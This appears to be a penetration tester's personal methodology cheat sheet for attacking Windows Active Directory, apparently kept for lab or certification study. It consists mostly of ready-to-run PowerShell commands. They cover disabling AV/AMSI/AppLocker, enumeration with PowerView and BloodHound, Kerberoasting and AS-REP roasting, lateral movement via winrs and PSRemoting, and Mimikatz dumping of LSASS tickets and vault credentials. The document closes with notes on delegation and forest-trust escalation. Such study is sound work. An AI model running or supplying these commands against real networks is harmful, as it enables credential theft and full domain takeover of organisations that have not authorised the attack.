# Methodology

## Beginning

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Bypass/deactivate AV/AMSI/
<strong>Bypass/deactivate AppLocker Policies
</strong>Bypass/deactivate Firewall
Get local Admin
Dump local users


. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
<strong>
</strong>. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess

<strong>Invoke-Sharefinder -vebose -domain ....
</strong><strong>
</strong><strong>Bloodhound/Sharphound
</strong><strong>=> Adding High-Value Targets (CS) / Set....
</strong><strong>=> Shortest Paths (CS) / Shortest Paths from Owned Principals (including everything)
</strong><strong>
</strong><strong>
</strong>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "yourusername"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "GroupName"}
<strong>
</strong><strong>DA with running sessions and local admin of us
</strong>Invoke-Userhunter -groupname "domain admins"

Kerberoast:
Get-DomainUser -SPN

AS-REP Roasting:
Get-DomainUser -PreauthNotRequired -verbose
. .\ASREPRoast\ASREPRoast.ps1
Invoke-ASREPRoast -verbose
 
<strong>
</strong></code></pre>



## New User

**=> New Bloodhound/Sharphound collection**

**Enumerate where you have local admin with the new user**

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Find-LocalAdminAccess -Verbose  ==> Results weird?!?!
<strong>
</strong><strong>. ./Find-WMILocalAdminAccess.ps1
</strong>Find-WMILocalAdminAccess
Find-WMILocalAdminAccess - Computerfile computer.txt -verbose (all domain Computerhostnames from Get-NetComputer)
winrs -r:hostname cmd
Enter-PSSession -ComputerName hostname.fqdn.local

. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
winrs -r:hostnamee cmd
Enter-PSSession -ComputerName hostname.fqdn.local

</code></pre>

**Enumerate Sessions with the new privs, because you need to be local admin**&#x20;

```powershell
Invoke-Userhunter -groupname "domain admins"
```

**Find modifieable ACLs with user / Member Groups**

{% code overflow="wrap" %}
```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "yourusername"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "GroupNameWhereYourUserIsMemberOf"}

=> AS-REP Roasting eg.
=> Set Permissions
```
{% endcode %}





### New Computer

**Dump Creds from Lsass**

```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"
```

**Dump creds from credential vault (Scheduled Tasks)**

```powershell
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

**Unconstrained delegation of the machine and domain admin connects to that machine?**

**If we have Trusts, get Enterprise Admin with authenitcation of dc of the forest to authenticate to us.**



\
